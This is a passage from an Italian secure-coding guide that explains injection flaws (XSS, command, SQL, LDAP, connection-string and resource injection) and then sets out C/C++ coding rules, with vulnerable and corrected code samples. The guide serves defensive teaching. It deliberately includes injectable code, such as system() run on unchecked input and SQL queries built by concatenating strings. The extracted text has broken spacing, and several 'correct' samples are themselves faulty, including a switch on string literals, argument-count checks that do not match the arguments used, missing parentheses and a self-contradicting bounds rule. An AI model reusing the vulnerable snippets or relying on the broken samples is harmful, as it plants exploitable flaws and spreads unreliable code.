7.1.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross-site scripting (XSS) è una vulnerabilità c he affligge siti web dinamici che operano un contro llo 
insufficiente dell'input. Un XSS permette ad un att accante di inserire o eseguire codice script lato c lient, al 
fine di attuare i seguenti exploit:  
• raccolta, manipolazione e reindirizzamento di infor mazioni riservate;  
• visualizzazione e modifica di dati presenti sui ser ver;  
• alterazione del comportamento dinamico delle pagine  web. 
 
Rientrano nelle problematiche di tipo XSS: 
• Stored XSS . Gli attacchi di tipo “stored XSS” sono quelli in cui lo script iniettato viene memorizzato 
in modo permanente sui server di destinazione, come  ad esempio in un database, in un forum di 
messaggi, in un registro dei visitatori, in un camp o commentato, etc. Da quel momento in poi, ogni 
qualvolta verrà rischiesta la pagina che include lo  script memorizzato, quest’ultimo verrà 
rispristinato ed eseguito. 
• Reflected XSS . Gli attacchi XSS riflessi, noti anche come attacc hi non persistenti, si verificano 
quando uno script dannoso viene restituito da un'ap plicazione Web al browser della vittima. Sono 
più diffusi, proprio per la facilità di propagazion e: non è neessario individuare alcun meccanismo 
per memorizzare permanentemente gli script malevoli . Sono i più evitabili e spesso i danni che 
apportano sono di entità inferiore, rispetto agli s tored XSS. 
Come difendersi 
Convalidare tutti gli input, indipendentemente dall a fonte: la convalidazione dovrebbe essere basata s u una 
white list (una lista di valori ammessi), per cui v errebbero accettati solo i dati che corrispondono, e 
verrebbero rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
 
 
Linee guida per lo sviluppo sicuro Pag. 48  a 156  
 
Un altro accorgimento consiste nel codificare compl etamente tutti i dati dinamici (encoding) in modo d a 
neutralizzare eventuali inserimenti malevoli. La co difica dovrebbe essere sensibile al contesto, in ba se al 
tipo di dato che si vuole neutralizzare: se ci si a spetta che possa esserci codice HTML abusivo, occor re 
codificare gli eventuali tag HTML, se ci si potrebb e trovare di fronte a uno script, allora bisogna co dificare 
gli elementi sintattici di Javascript, ecc. 
Nell'intestazione di risposta HTTP Content-Type, de finire in modo esplicito la codifica dei caratteri (charset) 
per l'intera pagina. 
Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura tramite script de i cookie di 
sessione. 
 
Esempio:  
Se ci si affida a programmi C/C++ per una web appli cation, il pericolo è insito nella specifica CGI (C ommon 
Gateway Interface), che offre l'opportunità di acce dere al file system. 
La necessità di bonificare l’input può essere soddi sfatta sottoponendo le stringhe in entrata a una ro utine di 
encoding come la seguente: 
 
void encode(std::string& data) { 
  std::string buffer; 
  buffer.reserve(data.size()); 
  for(size_t pos = 0; pos != data.size(); ++pos) { 
    switch(data[pos]) { 
      case '&': buffer.append("&amp;");    break; 
      case '\"': buffer.append("&quot;");   break; 
      case '\'': buffer.append("&apos;");   break; 
      case '<': buffer.append("&lt;");    break; 
      case '>': buffer.append("&gt;");    break; 
      default:  buffer.append(&data[pos], 1); break ; 
    } 
  } 
  data.swap(buffer); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.1.2  Command Injection 
Come riconoscerla 
In questa tipologia di attacco, l’aggressore potreb be eseguire comandi di sistema arbitrari sul server  
dell’applicazione.  
Se è in grado di iniettare e fare eseguire un coman do di sistema operativo, l’aggressore può eseguire 
qualsiasi comando, fino all’acquisizione completa d el controllo del server. 
La command injection è possibile se si utilizzano s tringhe di input dell'utente per creare comandi di shell 
che poi vengono eseguiti.  
Come difendersi 
Di seguito un elenco delle azioni da intraprendere:  
• Evitare qualsiasi esecuzione diretta di script di c omandi utilizzando l’input utente. Utilizzare 
piuttosto API messe a disposizione dal linguaggio o  da librerie di funzioni. 
• Se è impossibile rimuovere l'esecuzione del comando , eseguire solo stringhe statiche che non 
includono l'input dell'utente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Operare una convalida dell’input 
attraverso una white list di valori ammessi e altri  controlli, come evidenziato nel punto precedente. 
• Eseguire l'applicazione utilizzando un account uten te limitato che non disponga di privilegi non 
necessari. 
 
 
Linee guida per lo sviluppo sicuro Pag. 49  a 156  
 
• Se possibile, isolare tutta l'esecuzione dinamica u tilizzando un account utente separato e dedicato, 
che abbia privilegi solo per le operazioni e i file  specifici utilizzati dall'applicazione, in base al  
principio del "Least Privilege". Il principio stabi lisce che agli utenti venga attribuito il più basso  
livello di “diritti” che possano detenere rimanendo  comunque in grado di compiere il proprio 
lavoro. 
 
Esempio: 
#include <stdio.h> 
#include <unistd.h> 
  
int main(int argc, char **argv) { 
  
 char cat[] = "cat "; 
 char *command; 
 size_t commandLength; 
  
 commandLength = strlen(cat) + strlen(argv[1]) + 1;  
 command = (char *) malloc(commandLength); 
 strncpy(command, cat, commandLength); 
 strncat(command, argv[1], (commandLength - strlen( cat)) ); 
  
 system(command); 
 return (0); 
} 
 
L’istruzione system() esegue un commando provenient e dall’input, non verificato né controllato. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html,   
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
7.1.3  Connection String Injection 
Come riconoscerla 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database.  
Utilizzando semplici strumenti di modifica testo, l 'aggressore potrebbe essere in grado di eseguire un a delle 
seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database dell'attaccant e al posto dell’originario; 
• Scoprire la password dell'account di sistema del da tabase. 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se tali valori non sono stati verificati né tantomeno 
sanificati, potrebbero essere utilizzati per manipo lare la stringa di connessione. 
Come difendersi 
L’input deve essere validato, come già evidenziato nei punti precedenti. 
Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente una 
stringa di connessione, cercare di non includere l' input dell'utente. In ogni caso, utilizzare utilità  basate 
sulla piattaforma, come SqlConnectionStringBuilder di .NET. 
 
Esempio:  
 
int main( int argc, char* argv[] )  
{  
 int result; 
 
 
Linee guida per lo sviluppo sicuro Pag. 50  a 156  
 
 if ( argc == 3 ) 
 { 
  char* databaseServer = argv[1]; 
  char* databaseName = argv[2]; 
   
  char connString[BUFFER_SIZE] = database_PROTOCOL_ STRING; 
  strncat( connString, databaseServer, sizeof(connS tring) - 
strlen(connString) - strlen(database_PORT_STRING) ) ; 
  strcat( connString, database_PORT_STRING ); 
 
  sql::mysql::MySQL_Driver* database_driver = 
sql::mysql::get_mysql_driver_instance(); 
  sql::Connection* database_conn = database_driver- >connect( 
connString, database_USER, database_PASSWORD ); 
  database_conn->setSchema( databaseName ); 
   
  result = processData( database_conn ); 
   
  delete database_conn; 
 } 
 return result; 
} 
 
Nell’esempio riportato, la stringa di connessione v iene costruita concatenando parametri di input. 
Nel codice che segue, la scelta da una white list è  obbligata: 
 
int main( int argc, char* argv[] )  
{  
 int result; 
 if ( argc == 2 ) 
 { 
  int appId = atoi( argv[1] ); 
 
  char* connString; 
  char* databaseName;  
  switch( appId ) {  
   case APP_ID1: 
    connString = CONN_STRING_APP1; 
    break; 
   case APP_ID2: 
    connString = CONN_STRING_APP2; 
    break; 
   case APP_ID3: 
    connString = CONN_STRING_APP3; 
    break; 
   default: 
    connString = CONN_STRING_DEFAULT; 
  } 
 
  sql::mysql::MySQL_Driver* database_driver = 
sql::mysql::get_mysql_driver_instance(); 
  sql::Connection* database_conn = database_driver- >connect(connString, 
database_USER, database_PASSWORD); 
   
  result = processData(database_conn); 
   
  delete database_conn; 
 } 
 return result; 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 51  a 156  
 
7.1.4  Resource Injection 
Come riconoscerla  
L'applicazione apre un socket di rete, per l'ascolt o delle connessioni in entrata, utilizzando dati no n 
attendibili per configurarlo, consentendo a un even tuale malintenzionato di controllarlo. 
Il malintenzionato potrebbe perciò essere in grado di aprire una backdoor che gli consenta di connette rsi 
direttamente al server delle applicazioni, acquisen do il controllo del server o esponendolo ad altri a ttacchi 
indiretti. In particolare, modificando il numero di  porta del socket, un utente malintenzionato può es sere in 
grado di aggirare controlli di rete deboli, mascher ando l'attacco da parte di altri dispositivi di ret e. 
Una resource injection può essere sfruttata anche p er bypassare i firewall o altri meccanismi di contr ollo 
degli accessi. Si può anche utilizzare l'applicazio ne come proxy per la scansione delle porte delle re ti interne 
e per l'accesso diretto ai sistemi locali; oppure i ndurre un utente a inviare informazioni riservate a  un server 
fasullo. 
Come difendersi  
Non consentire a un utente di definire i parametri relativi ai sockets di rete. Il principio della whi te list può 
essere adottato per scegliere un valore tra quelli ammissibili, codificandoli – ad esempio - in una sw itch. 
 
Esempio:  
 
int main( int argc, char* argv[] )  
{  
 int sockfd, portno; 
 struct sockaddr_in serv_addr = {};  
 struct hostent *server; 
  
 if ( argc != 3 ) 
  errorAndExit(); 
 
 server = gethostbyname(argv[1]); 
 if (server == NULL)    
  errorAndExit(); 
   
 portno = atoi(argv[2]); 
 
 serv_addr.sin_family = AF_INET; 
 memcpy(&serv_addr.sin_addr.s_addr, server->h_addr,  server->h_length); 
 serv_addr.sin_port = htons(portno); 
  
 sockfd = socket(AF_INET, SOCK_STREAM, 0); 
 if (sockfd < 0)  
  errorAndExit(); 
   
 if (connect(sockfd, &serv_addr, sizeof(serv_addr))  < 0)  
  errorAndExit(); 
 
 sendAndProcessMessage(sockfd); 
  
 close(sockfd); 
} 
In questo esempio la configurazione del socket vien e realizzata con l’input non verificato proveniente  
dall’utente. Qui di seguito la scelta è ristretta a  una white list: 
 
int main( int argc, char* argv[] )  
{  
 int sockfd, portno; 
 struct sockaddr_in serv_addr = {};  
 char* portname; 
  
 if ( argc != 1 ) 
  errorAndExit(); 
 
 
Linee guida per lo sviluppo sicuro Pag. 52  a 156  
 
 
 portname = argv[1]; 
 switch (portname) { 
  case "quicktime": 
   portno = 1220; 
   break; 
  case "kazaa": 
   portno = 1214; 
   break;  
  case "battlenet": 
   portno = 1119; 
   break; 
  default: 
   portno = 80; 
 } 
  
 serv_addr.sin_family = AF_INET; 
 memcpy(&serv_addr.sin_addr.s_addr, SERVER_ADDRESS,  strlen(SERVER_ADDRESS)); 
 serv_addr.sin_port = htons(portno); 
  
 sockfd = socket(AF_INET, SOCK_STREAM, 0); 
 if (sockfd < 0)  
  errorAndExit(); 
   
 if (connect(sockfd, &serv_addr, sizeof(serv_addr))  < 0)  
  errorAndExit(); 
 
 sendAndProcessMessage(sockfd); 
  
 close(sockfd); 
} 
 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.1.5  SQL Injection 
Come riconoscerla  
Si verifica quando l’input non verificato viene uti lizzato per comporre dinamicamente uno statement SQ L 
che poi verrà eseguito sulla base dati. Adeguatamen te manipolati, i parametri di input possono modific are 
le query in maniera sostanziale, causando danni di impatto notevole, come l’inserimento di dati malevo li, la 
cancellazione e la modifica di record e la rivelazi one indebita di informazioni riservate. Se i dati u tilizzati per 
la SQL injection sono memorizzati nel database o ne l file system in generale, si parla di SQL injectio n di 
second’ordine (second order SQL injection). 
Come difendersi 
Mettere in pratica i seguenti suggerimenti:  
• Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato 
nei punti precedenti. 
• Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Si 
devono invece utilizzare componenti di database sic uri come le stored procedure (stored 
procedures), query parametrizzate e le associazioni  degli oggetti (per comandi e parametri). 
• Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis. 
• Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari). 
 
Esempio:  
int main(int argc, char** argv) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 53  a 156  
 
 char *nomeUtente = argv[2]; 
  
 // Codice passibile di SQL Injection 
 char query[1000] = {0}; 
 sprintf(query, "SELECT USER_ID FROM UTENTI where n ome = \"%s\"", nomeUtente); 
 executeSql(query); 
  
 // Codice "sanificato" 
 char nomeUtenteSql[1000] = {0}; 
 encodeSqlString(nomeUtenteSql, 1000, nomeUtente);  
 char querySanificata[1000] = {0}; 
 sprintf(querySanificata, "SELECT USER_ID FROM UTEN TI where nome = \"%s\"", 
nomeUtenteSql); 
 executeSql(querySanificata); 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.1.6  LDAP Injection 
Come riconoscerla 
Come in tutti i casi d’injection, anche in questo c aso a essere sfruttato per l’attacco è l’input dell ’utente, nel 
momento in cui viene utilizzato, senza subire alcun  controllo o filtro, per comporre una query LDAP. 
Il pericolo è che venga inquinata la directory LDAP , che contiene una base dati relativa a delle utenz e. 
Con un attacco LDAP injection è possibile leggere d ati riservati, come è anche possibile modificarli, 
cancellarli o inserire utenze che poi possono esser e utilizzate per successivi attacchi. 
 
Esempio:  
Il seguente codice riceve un parametro in input per  comporre una query LDAP. 
fgets(nomeUtente, sizeof(nomeUtente), socket); 
snprintf(queryLDAP, sizeof(queryLDAP, "(cn=%s)", no meUtente); 
 
Se nomeUtente è “Mario Rossi”, la query restituirà i dati relativi all’utente in questione, ma se vien e fornito 
il carattere “*”, verrà restituito l’intera directo ry di utenze.  
Come difendersi 
Occorre mettere in pratica le misure che seguono. C ome in altri tipi d’injection, sono fondamentali il  
controllo e l’encoding dell’input, per costruire fi ltri e query verso server LDAP. 
L’encoding deve filtrare i seguenti caratteri: \ # + < > , ; " = 
Altri caratteri scpeciali sono utilizzati all’inter no delle query LDAP e quindi non possono essere eli minati in 
automatico:  * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' 
Il controllo applicativo, dipendente dal contesto, assume un’importanza fondamentale. 
Anche ridurre al minimo i privilegi assegnati all’u tenza con la quale il server LDAP è avviato è una m isura 
utile a minimizzare le conseguenze di un attacco. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,   
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.1.7  Process control 
Come riconoscerla 
Le vulnerabilità del controllo di processo si verif icano quando nell'applicazione vengono importati da ti 
provenienti da un'origine non attendibile. Tali dat i vengono successivamente caricati utilizzando il m etodo 
Load-Library. Controllando il nome o il percorso de lla libreria, un utente malintenzionato può sostitu ire la 
 
 
Linee guida per lo sviluppo sicuro Pag. 54  a 156  
 
libreria legittima con una libreria dannosa. Ciò pu ò comportare l'esecuzione di comandi (e payload) 
dannosi. 
 
La vulnerabilità si esplicita in due forme distinte : l’aggressore controlla l’indirizzo della libreria  all’interno 
del programma, oppure controlla l’ambiente e quindi  la libreira puntata dal programma. 
Come difendersi 
Oltre al consueto principio dei minimi privilegi e il controllo dell’input, qui occorre verificare sem pre 
l’attendibilità delle librerie importate. 
L’applicazione non deve caricare librerie non neces sarie o delle quali può fare a meno. 
Invece dei path relativi, l’applicazione deve utili zzare path assoluti per individuare il percorso del le librerie 
da caricare. 
 
Esempio: 
Nel seguente codice la libreria viene caricata a pa rtire da un indirizzo scritto nel registry. Chiunqu e acceda 
al registry può sostituirlo con l’indirizzo di una copia manipolata della libreria medesima. 
 
RegQueryValueEx(hkey, "APP_HOME_DIR", 0, 0, (BYTE*) appHomeDir, &size); 
char* libreria=(char*)malloc(strlen(appHomeDir)+str len(INITLIB)); 
if (libreria) { 
  strcpy(libreria, appHomeDir); 
  strcat(libreria,INITCMD); 
  LoadLibrary(libreria); 
} 
 
Se si utilizza un percorso assoluto, la libreria vi ene prelevata da un percorso più difficilmente mani polabile. 
Utilizzare la System.load() in luogo della System.l oadLibrary(), perché più sicura. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/114.html,   
CWE-114: Process Control. 
7.1.8  Ulteriori indicazioni per lo sviluppo sicuro 
La raccolta di Best Practices che segue, è conforme  ai dettami degli standard CERT C / C++ Programming  
Language Secure Coding. 
7.1.8.1  Dichiarazioni 
• È consigliato dimensionare gli array non utilizzand o costanti numeriche ma piuttosto costanti 
simboliche definite  
Esempio:  
Forma non corretta:  
int mesi[13];   
Forma corretta:    
int mesi[TOT_MESI + 1]; 
 
• Dichiarare le costanti utilizzando la keyword "cons t” 
Esempio:  
Forma non corretta: 
int mesi = 12;  
Forma corretta: 
const unsigned int mesi = 12;  
• Dichiarare le variabili che possono avere valori po sitivi utilizzando la keyword "unsigned" 
• Il tipo "char" deve essere unsigned 
• Non utilizzare float e double quando non è necessar io (calcoli scientifici) 
• Le classi che hanno funzioni virtuali devono sempre  avere distruttori virtuali 
 
 
Linee guida per lo sviluppo sicuro Pag. 55  a 156  
 
• Inizializzazioni 
• Tutte le variabili locali devono essere inizializza te prima di essere utilizzate. Se sono inizializzat e con 
valori "dummy" o momentanei devono essere reinizial izzate con i valori reali al momento dell'uso. 
• Tutte le variabili legate ai cicli devono essere re inizializzate con l'entrata in una nuova iterazione  
prima di essere riutilizzate nel nuovo ciclo. 
• Tutte le strutture devono essere azzerate prima del  loro utilizzo. 
• Tutti i buffer devono essere azzerati prima del lor o utilizzo o riutilizzo. 
7.1.8.2  Utilizzo dei tipi di dati 
Stringhe 
• Tutte le stringhe devono essere terminate dal carat tere NULL. Evitare errori logici di 
programmazione che agevolino l’insorgere di una con dizioni di memory leak. Deve essere riposta la 
massima attenzione nell’utilizzo di funzioni che no n aggiungono al termine di una stringa copiata in 
un buffer di destinazione il carattere NULL se ques to non risiede nel buffer sorgente.  
Esempio: 
Forma non corretta: 
strncpy(dest, source, sizeof(dest));  
Forma corretta: 
strncpy(dest, source, sizeof(dest); 
dest[sizeof(dest) – 1] = ‘\0’; 
 
• Il codice non deve effettuare operazioni su una str inga o su un char arrayche non siano terminati 
dal carattere NULL;  
• L’input proveniente dall’utente deve sempre essere convalidato e scremato da caratteri invalidi ( ;| 
! & ~ ' " - * % ` \ / < > ? $ @ : ( ) [ ] { } . ) p rima di essere passato alle successive elaborazioni  
dell’applicazione (ad esempio alla funzione system( ) );  
• Utilizzare le funzioni strspn(), strcspn() e strpbr k() per filtrare l’input utente; 
• Il formato delle stringhe deve sempre essere specif icato nei parametri delle funzioni che lo 
richiedono. In questo contesto le funzioni consider ate critiche e soggette a problematiche di format 
string overflow, se non correttamente utilizzate, s ono: printf(), fprintf(), sprintf(), snprintf(), 
vprintf(), vfprintf(), vsprintf(), vsnprintf(), sca nf(), fscanf(), sscanf(), vscanf(), vsscanf(), vfsc anf(), 
wprintf(), fwprintf(), swprintf(), vwprintf(), vfwp rintf(), vswprintf(). 
Esempio: 
Forma non corretta: 
printf(buffer1); 
snprintf(dest, sizeof(dest), buf); 
fprintf(FILE, num, stringa); 
Forma corretta: 
printf(“%s\r\n”, buffer1); 
snprintf(dest, sizeof(dest), “%s”, buf); 
fprintf(FILE, “%d: %s%\n”, num, stringa); 
Buffer  
Tutti i buffer devono essere abbastanza grandi per contenere i dati a loro destinati, inoltre: 
• Evitare l’utilizzo di funzioni che non consentono d i specificare la dimensione delle stringhe copiate 
da un buffer sorgente a uno di destinazione. Le fun zioni considerate critiche in questo contesto, 
che non devono mai essere utilizzate sono: strcpy() , wcscpy(), sprintf(), strcat(), gets(), scanf(), 
vsprintf() e wcscat(); 
• Quando i dati vengono copiati all'interno di un buf fer deve essere sempre verificata la loro 
dimensione confrontandola con quella del buffer di destinazione. Le funzioni considerate critiche 
per errori di bound-checking, pur permettendo di sp ecificare la lunghezza delle stringhe soggette a 
copia da un buffer all’altro, sono: strncpy(), wcsn cpy(), snprintf(), strncat(), vsnprintf(), wcsncat( ), 
 
 
Linee guida per lo sviluppo sicuro Pag. 56  a 156  
 
memcpy(), memmove(), memset(), strxfrm(), wcsxfrm() , wmemset(), wmemcpy(), wmemmove(), 
wcstombs(), wcsrtombs(), mbstowcs(), mbsrtowcs(), s wprintf() e vswprintf().  
 
Di seguito alcuni esempi di funzioni solitamente co nsiderate sicure, ma utilizzate in modo errato. 
 
Esempio: 
Forma non corretta: 
char dest[512]; 
char *source; 
// puntatore char source manipolabile 
// dall’utente 
strncpy(dest, source, strlen(source));  
#define LEN 5000 
// LEN superiore alla capacità  
// di contenimento massima di  
// dest  
char dest[1024]; 
// variabile source manipolabile  
// dall’utente 
char source[LEN];  
memcpy(dest, source, LEN); 
 
Forma corretta: 
char dest[512]; 
strncpy(dest, source, sizeof(dest); 
/* inserimento di NULL alla fine di  
  dest 
*/ 
... 
#define LEN 1024; 
char dest[1024]; 
// variabile source manipolabile  
// dall’utente 
char source[LEN];  
memcpy(dest, source, LEN - 1); 
/* inserimento di NULL alla fine di  
  dest 
*/ 
...        
 
7.1.8.3  Bitfields 
Se nel codice vengono svolte operazioni di bit shif ting o si utilizzano bitfield, bisogna indicare le piattaforme 
con cui il codice è compatibile per mitigare proble mi/errori di porting. 
7.1.8.4  Macro 
Se le macro sono espanse, i parametri passati non d evono causare effetti collaterali. 
 
Esempio:  
Forma non corretta:  
#define max(a, b) (a) > (b) ? (a) : (b)  
risultato = max(i, j) + 3; 
/* 
 * tutto questo viene espanso in 
 * risultato = (i) > (j) ? (i) : (j)+3;  
 * 
 */  
 
Forma corretta: 
#define max(a,b) ( (a) > (b) ? (a) : (b) )  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 57  a 156  
 
Gli argomenti delle macro devono essere accuratamen te racchiusi in parentesi. 
7.1.8.5  L’operatore sizeof e il passaggio di dati come para metri 
Il passaggio della dimensione di una struttura dati  come parametro a una funzione deve essere effettua to 
in maniera corretta, tramite l’utilizzo della funzi one sizeof(). A tal proposito, è necessario svilupp are 
consapevolezza degli errori qui menzionati, e non r ipeterli: 
 
Esempio:  
Forma non corretta: 
strlen(struttura)  
sizeof(ptr) 
sizeof(*array) 
/* 
 * Dimensione di un solo elemento 
 */ 
sizeof(array) 
 
Forma corretta: 
sizeof(struttura) 
sizeof(*ptr) 
sizeof(array) 
/* 
 * Dimensione di un solo elemento 
 */ 
sizeof(array[0])  
 
Gli argomenti delle macro devono essere accuratamen te racchiusi in parentesi. 
7.1.8.6  Allocazione dinamica 
Il successo dei linguaggi C e C++ è dovuto alla gra nde flessibilità che offrono allo sviluppatore nell a gestione 
diretta della memoria della macchina. Ciò offre ill imitate possibilità, ma comporta anche rischi piutt osto 
elevati. Per mitigare tali rischi occorre adottare i seguenti suggerimenti: 
• Lo spazio di memoria allocato dinamicamente (ad ese mpio con le funzioni malloc(), 
calloc() e realloc() deve essere appropriato alla d imensione dei dati che deve 
contenere; 
• L’applicazione deve provvedere all’allocazione e al la deallocazione della memoria. 
Nell’ambito della programmazione multithreaded, val e lo stesso principio: ogni 
thread deve allocare e deallocare la propria memori a, senza delegare la 
deallocazione ad altri thread; 
• Se si scrive codice C++ è meglio sfrutttare le cara tteristiche peculiari di questo 
linguaggio, piuttosto che appoggiarsi alle struttur e del C, mantenute per 
compatibilità. Esempio: utilizzare "new" invece che  malloc(), calloc(), e 
realloc() ; 
7.1.8.7  Deallocazione  
• Gli array non devono essere cancellati come dati sc alari; 
Esempio:  
      Forma non corretta: 
delete mioarray;  
      Forma corretta: 
delete [ ] mioarray; 
 
• Non devono esistere puntatori a risorse distrutte: contestualmente alla distruzione delle risorse 
vanno dereferenziati tutti i puntatori; 
• I puntatori relativi alla memoria allocata dinamica mente devono essere impostati a NULL subito 
dopo essere stati rilasciati; 
• I puntatori ottenuti via malloc(), calloc(), realloc()  devono essere distrutti con free()  (mai usare delete); 
 
 
Linee guida per lo sviluppo sicuro Pag. 58  a 156  
 
• I puntatori ottenuti via new devono essere distrutt i con delete (mai usare free() ); 
• Mai liberare un’area di memoria (ad esempio con free() ) già deallocata. Evitare errori logici nel 
codice che consentano l’insorgere di problematiche di questo tipo; 
• Mai tentare di scrivere in un buffer residente in h eap memory dopo la sua deallocazione. Evitare 
l’insorgere di errori logici di questo tipo. 
7.1.8.8  Puntatori 
• Gestire opportunamente i puntatori a NULL; 
Esempio:  
Forma non corretta: 
char tmpchar1 (char *s) 
{  
  return *s; 
} 
//”s” ==  NULL  CRASH  
 
Forma corretta: 
char tmpchar1 (char *s) 
 
{ 
   if (s == NULL) return ‘\0’; 
   return *s; 
} 
7.1.8.9  Casting e problematiche di gestione delle variabili  numeriche 
• Il tipo NULL  deve essere corretto mediante casting quando passa to come parametro a una funzione; 
• Ridurre al minimo le comparazioni fra interi di tip o signed. Se due interi di tipo signed vengono 
comparati, deve essere previsto il caso “minore di zero” ( < 0  ), soprattutto quando la comparazione 
avviene con un valore costante.  
Esempio: 
Comparazione non signed: 
if ((int)val1 < (unsigned int)val2) 
/* in questo caso unsigned ha la precedenza essendo  un tipo più grande di 
signed. Entrambi i valori  
(val1 e val2) vengono quindi  
convertiti ad unsigned prima di essere comparati 
*/ 
if ((int)val < sizeof(costante)) 
// l’operatore sizeof è unsigned 
 
Comparazione signed: 
if ((int)val < 256) 
if (unsigned short)val1 < (short)val2) 
/* la seguente comparazione dovrebbe, in base al ti po di compilatore, essere 
signed perchè entrambi gli short dovrebbero essere convertiti a signed integer 
prima di essere comparati 
*/ 
 
• Evitare di utilizzare variabili signed integer come  length specifier, ovvero come indicatori 
dell’allocazione/dimensione di un buffer o di un ar ray. 
• Evitare che un intero, a seguito di un’operazione d i moltiplicazione, addizione o sottrazione, cresca 
oltre il suo valore massimo o decresca sotto il suo  valore minimo. Ad esempio su architettura a 32 
bit se un intero signed a 16 bit dal valore 32767 v iene incrementato di una unità, il suo valore 
diverrà -32768, producendo un errore di overflow. È  bene assicurarsi che questo genere di 
condizioni non si verifichi in alcun caso, soprattu tto su input fornito dall’utente, in prossimità 
dell’allocazione di un buffer o della copia di dati  da un buffer all’altro. 
 
 
Linee guida per lo sviluppo sicuro Pag. 59  a 156  
 
• La conversione fra interi di differenti dimensioni deve essere il più possibile evitata. La conversion e 
di un intero di grandi dimensioni a uno più piccolo  (da 32 a 16 bit o da 16 a 8 bit) può causare il 
troncamento del valore memorizzato in una variabile  o determinarne il cambio di segno. Ad 
esempio convertire l’intero signed a 16 bit -1 in i ntero unsigned a 32 bit darà come risultato il 
valore 4.294.967.295 
In particolare sono negate tutte le conversioni rip ortate nella seguente tabella: 
Da  A 
16 bit signed  32 bit unsigned  
32 bit signed  16 bit unsigned  
32 bit unsigned  16 bit signed  
32 bit signed  16 bit signed  
 
Il codice non deve affidarsi a conversioni implicit e e/o dedotte dal compilatore. 
7.1.8.10  Computazione e condizionali 
• I dati devono essere appropriatamente confrontati c on altri dello stesso tipo, specialmente per i 
tipi float e double.  
Esempio:  
if ( variabile == 0.1 )  questa condizione potrebbe non rivelarsi mai vera,  per le proprietà di 
arrotondamento del compilatore; 
• Le variabili dichiarate come unsigned non devono ma i essere confrontate con lo zero utilizzando 
l'operatore "maggiore di".  
Esempio: if ( variabile > 0) risulta sempre vero se  variabile è unsigned; 
• Le variabili dichiarate come signed, non devono mai  essere confrontate con TRUE. 
Esempio: if (variabile) 
Se ad esempio variabile può assumere un valore nega tivo è meglio prevedere questo caso con un 
controllo del tipo: if (variabile != 0) oppure anco ra più esplicito controllando il segno dell’intero.  
7.1.8.11  Controllo del flusso 
Variabili di controllo  
È obbligatorio utilizzare sempre un limite superior e "inclusive" e il limite inferiore come "esclusive ".  
Esempio: 
Forma non corretta: 
x >= 23 e x <= 42 
Forma corretta: 
x >= 23 e x < 43 
Switches  
• Ogni blocco di codice appartenente a ogni “case” di  uno switch deve essere terminato dalla 
keyword "break";  
• Ogni switch deve avere un “case” di default. 
7.1.8.12  Passaggio di argomenti 
• I tipi di dati esterni non devono essere passati "p er valore" (by value); 
• I vettori e le strutture devono sempre essere passa ti per indirizzo o per riferimento; 
• È auspicabile utilizzare la keyword “const” per i p arametri costanti (strutture o vettori) passati in 
ingresso a una funzione. 
7.1.8.13  Valori di ritorno 
I tipi di dati devono essere appropriati per memori zzare i valori di ritorno delle funzioni; 
 
 
Linee guida per lo sviluppo sicuro Pag. 60  a 156  
 
7.1.8.14  Chiamate a funzioni 
• Ogni chiamata a fprintf() deve avere il suo argomen to FILE pointer inizializzato; 
• Ogni chiamata a funzione deve contenere i parametri  corretti, coerenti con il tipo e il formato del 
prototipo della funzione.  
7.1.8.15  Files 
• Ogni nome di file temporaneo deve essere unico e no n predicibile; 
• Ogni file deve essere chiuso prima di essere riutil izzato (Esempio: fclose()). 
7.1.8.16  Gestione degli errori 
• I valori di ritorno di tutte le chiamate di sistema  devono essere controllati per determinare lo stato  
di esecuzione del programma. Funzioni come perror() , ferror() ed strerror() e la costante errno 
devono essere utilizzate per determinare o riportar e all’utente il tipo di errore occorso; 
• errno non deve essere dichiarato manualmente come u n extern se risiede in uno degli include 
dell’implementazione C/C++ utilizzata; 
• Al verificarsi di un errore critico o imprevisto, a  seguito di una chiamata di sistema, tutti i puntat ori 
e le aree di memoria utilizzate devono essere deref erenziati/disallocate prima della chiusura del 
programma. 
7.1.8.17  Sicurezza dell’applicazione 
• I risultati dei controlli, delle procedure di sicur ezza e i relativi dati non devono risiedere in memo ria 
